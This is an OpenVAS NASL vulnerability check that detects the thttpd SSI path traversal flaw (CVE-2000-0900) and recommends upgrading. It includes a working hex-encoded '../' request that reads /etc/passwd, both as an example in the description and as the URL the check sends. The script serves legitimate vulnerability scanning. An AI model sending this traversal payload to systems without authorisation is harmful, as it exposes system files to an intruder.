###############################################################################
# OpenVAS Vulnerability Test
# $Id: thttpd_ssi.nasl 8929 2018-02-23 05:05:21Z ckuersteiner $
#
# thttpd ssi file retrieval
#
# Authors:
# Thomas Reinke <reinke@cvs.nessus.org>
#
# Copyright:
# Copyright (C) 2000 Thomas Reinke
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:acme:thttpd";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10523");
  script_version("$Revision: 8929 $");
  script_tag(name:"last_modification", value:"$Date: 2018-02-23 06:05:21 +0100 (Fri, 23 Feb 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(1737);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2000-0900");
  script_name("thttpd ssi file retrieval");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2000 Thomas Reinke");
  script_family("Remote file access");
  script_dependencies("gb_thttpd_detect.nasl");
  script_mandatory_keys("thttpd/installed");

  script_tag(name: "solution", value: "Upgrade to version 2.20 of thttpd.");

  script_tag(name: "summary", value: "The remote HTTP server allows an attacker to read arbitrary files on the
remote web server, by employing a weakness in an included ssi package, by prepending pathnames with %2e%2e/
(hex-encoded ../) to the pathname.

Example:   GET /cgi-bin/ssi//%2e%2e/%2e%2e/etc/passwd

will return /etc/passwd.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/ssi//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd";

if (http_vuln_check(port: port, url: url, pattern: ".*root:.*:0:[01]:.*", check_header: TRUE)) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
